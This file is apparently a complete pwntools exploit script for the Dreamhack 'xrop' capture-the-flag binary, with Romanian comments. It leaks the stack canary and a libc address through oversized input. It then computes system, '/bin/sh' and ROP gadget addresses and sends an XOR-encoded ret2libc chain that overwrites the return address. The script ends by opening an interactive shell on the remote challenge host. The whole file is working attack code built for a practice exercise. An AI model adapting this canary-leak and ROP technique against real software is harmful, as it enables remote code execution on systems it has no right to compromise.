from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/xrop/deploy/prob')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:17279'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
   

#fiecare byte din input e xored cu urmatorul
#avem o addr de 8 bytes
#b[0] ^= b[1]   (trimitem din timp b0^b1^b2^b3^b4
#b[1] ^= b[2]   (trimitem din timp b1^b2^b3^b4
#b[2] ^= b[3]   (trimitem din timp b2^b3^b4)
#b[3] ^= b[4]...(trimitem din timp b3^b4)
#b[4] send
#more bytes
def prep_addr(byted):
    leng = len(byted)
    byted_array = bytearray(byted)
    for i in range(0, leng):
        for j in range(i+1, leng):
            byted_array[i] ^= byted_array[j]
    return bytes(byted_array)
    
#first off incercam un leak canary, apoi leak libc.

payload = b"ABCD"*6 + b"X"
p.send(payload)
p.recvuntil(b"X")

canary_leak = p.recv(7)
canary = u64(canary_leak.rjust(8, b"\x00"))
print(f"canary is {hex(canary)}")

#same thing dar acum leak libc
payload = b"ABCD"*50 
p.send(payload)
#pe la <__libc_start_call_main+128>

p.recvuntil(b"D")
libc_leak = p.recv(6)
libc_misterios = u64(libc_leak.ljust(8, b"\x00"))

print(f"libc misterios is {hex(libc_misterios-128)}")

#we dont have libc so no one gadget so need pop rdi ret gadget

libc = libc_misterios - 0x29e40
system = libc + 0x050d60
binsh = libc + 0x1d8698
pop_rdi_ret = libc + 0x2a3e5
ret = libc + 0xf41c9

print(f"libc is {hex(libc)}")

#overwrite return
payload = ( b"ABCD"*6 +
            p64(canary) + # b"\x00" +
            p64(0xdeadbeefdeadbeef) + #rbp null
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) +
            p64(system)
          )
 
payload_xor = prep_addr(payload)
p.send(payload_xor)

#leave loop.
exit_hex = b"exit\x00"
exit = prep_addr(exit_hex)
p.send(exit)

p.interactive()
